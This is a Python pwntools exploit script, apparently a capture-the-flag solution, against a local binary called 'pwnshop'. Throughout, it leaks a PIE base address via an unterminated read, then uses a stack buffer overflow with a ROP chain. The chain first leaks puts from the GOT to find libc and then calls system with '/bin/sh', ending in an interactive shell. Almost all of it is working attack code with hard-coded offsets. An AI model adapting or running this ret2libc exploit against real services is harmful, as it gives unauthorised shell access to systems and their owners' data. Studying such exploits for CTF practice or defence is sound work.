#!/usr/bin/env python3 
# -*- coding: utf-8 -*- 
# This exploit template was generated via: 
# $ pwn template ./pwnshop --host 127.0.0.1 --port 8888 
from pwn import * 
import struct 
 
# Set up pwntools for the correct architecture 
exe = context.binary = ELF('./pwnshop') 
 
# Many built-in settings can be controlled on the command-line and show up 
# in "args".  For example, to dump all data sent/received, and disable ASLR 
# for all created processes... 
# ./exploit.py DEBUG NOASLR 
# ./exploit.py GDB HOST=example.com PORT=4141 
host = args.HOST or '127.0.0.1' 
port = int(args.PORT or 8888) 
 
def start_local(argv=[], *a, **kw): 
    '''Execute the target binary locally''' 
    if args.GDB: 
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw) 
    else: 
        return process([exe.path] + argv, *a, **kw) 
 
def start_remote(argv=[], *a, **kw): 
    '''Connect to the process on the remote host''' 
    io = connect(host, port) 
    if args.GDB: 
        gdb.attach(io, gdbscript=gdbscript) 
    return io 
 
def start(argv=[], *a, **kw): 
    '''Start the exploit against the target.''' 
    if args.LOCAL: 
        return start_local(argv, *a, **kw) 
    else: 
        return start_remote(argv, *a, **kw) 
 
# Specify your GDB script here for debugging 
# GDB will be launched if the exploit is run via e.g. 
# ./exploit.py GDB 
gdbscript = ''' 
 
'''.format(**locals()) 
#b *0x5555555550a0 
#b *0x55555555528a 
#b *0x55555555532a 
#b *0x555555555350 
#b *0x55555555532a 
#b *0x555555555329 
 
 
#=========================================================== 
#                    EXPLOIT GOES HERE 
#=========================================================== 
# Arch:     amd64-64-little 
# RELRO:    Partial RELRO 
# Stack:    No canary found 
# NX:       NX enabled 
# PIE:      PIE enabled 
 
io = start() 

#0x55555555532a contains reads input to 80 byte buffer 
#   72 bytes between read string and next instruction(ret address)/rip <--- when buying***Confirmed*** 
 
#0x5555555552ae contains read for 'what do you wish to sell'           <--- when selling 
#   31 bytes; distance to return address is 72; not enough buffer 
 
#0x55555555530b in selling route contains read function; leave message <---input 13.37 for sell price 
#   64 bytes; stored in pointer address 0x005555555580c0 
 
#0x55555555526a <--- sell function 

#0x40c0 <--- offset between base binary address and leaked address
#I know the base via /proc/self/maps; can calculate offset between base and leaked address
#Subtract base from leaked
#Because printf is accepting 8 bytes of characters with NO NULL term(\x00), next address is leaked
#Base = Leaked - 0x40c0

io.recvuntil(b'>')
io.sendline(b'2')
io.recvuntil(b'What do you wish to sell? ')
io.sendline(b'a')

#Get leaked address due to lack of NULL bytes (\x00) from read() function in C
print(io.recvuntil(b'How much do you want for it? '))
io.sendline(b'aaaaaaaa')
io.recvuntil(b'aaaaaaaa')
leaked = io.recv().split(b'?')[0]
leaked = bytearray(leaked).ljust(8, b'\x00')
leaked = struct.unpack('q', leaked)
log.success("Leaked Address at: %s", hex(leaked[0]))

#Find difference to get base binary
log.success("Calculating Base of Binary: %s", hex(leaked[0]-16576))

#ROP chain development
base = leaked[0] - 16576
poprdi = base + 5059
gotputs = base + 16408  #pointer to puts function
callputs = base + 4144
subrsp = base + 4633
buy = base + 4906

#Payload One
#   -r returns to sub rsp, 0x28 to create space on stack, returns to 'd' address
#   -d pops rsp into rdi; parameter for puts, which is next address on stack > GOT address for puts, returns to puts call address
#   -c calls puts with rdi parameter containing GOT address of puts; printing GOT address
#   -with GOT address of PUTS, we can determine the base of C library used by binary
#Buffer = 80 bytes
c = struct.pack('<q', callputs)
p = struct.pack('<q', gotputs)
r = struct.pack('<q', subrsp)
d = struct.pack('<q', poprdi)
b = struct.pack('<q', buy)

payload=b'A'*40+d+p+c+b+r
io.sendline(b'11')
io.recvuntil(b'Enter details: ')
io.send(payload)
putsinbinary = (bytearray(io.recvline()[:6])).ljust(8, b'\x00')
decodeputs = struct.unpack('q', putsinbinary)

#Payload Two
#Use "readelf -s path_to_libc_used_by_binary" to find offset of functions
#000000000004c330 <--- offset of system in /usr/lib/x86_64-linux-gnu/libc.so.6
libbase = decodeputs[0] - 489504  #1628128
syst = libbase + 312112
bs = libbase + 1663025
s = struct.pack('<q', syst)
binsh = struct.pack('<q', bs)
payload = b'A'*40+d+binsh+s+b+r 
log.success("Base Libc address?: %s", hex(libbase))
#io.sendafter(b'Enter details: ', payload)
io.recvuntil(b'Enter details: ')
io.sendline(payload)
io.interactive()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#io.interactive()
